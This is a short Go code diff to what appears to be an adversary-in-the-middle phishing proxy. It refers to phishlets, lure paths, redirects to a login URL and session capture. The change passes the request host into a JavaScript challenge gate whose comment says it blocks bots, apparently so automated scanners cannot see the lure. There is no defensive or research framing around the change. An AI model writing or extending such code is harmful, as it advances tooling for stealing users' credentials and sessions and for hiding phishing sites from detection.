@@ -464,7 +464,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								// JS challenge gate — bots that don't execute JS never pass.
 								if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
-									return ChallengeResponse(req, req_path, p.challengeSecret)
+									return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 								}
 
 								session, err := NewSession(pl.Name)
@@ -675,7 +675,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// JS challenge gate — must pass before any redirect
 						if !ValidChallengeCookie(req, req_path, p.challengeSecret) {
-							return ChallengeResponse(req, req_path, p.challengeSecret)
+							return ChallengeResponse(req, req.Host, req_path, p.challengeSecret)
 						}
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
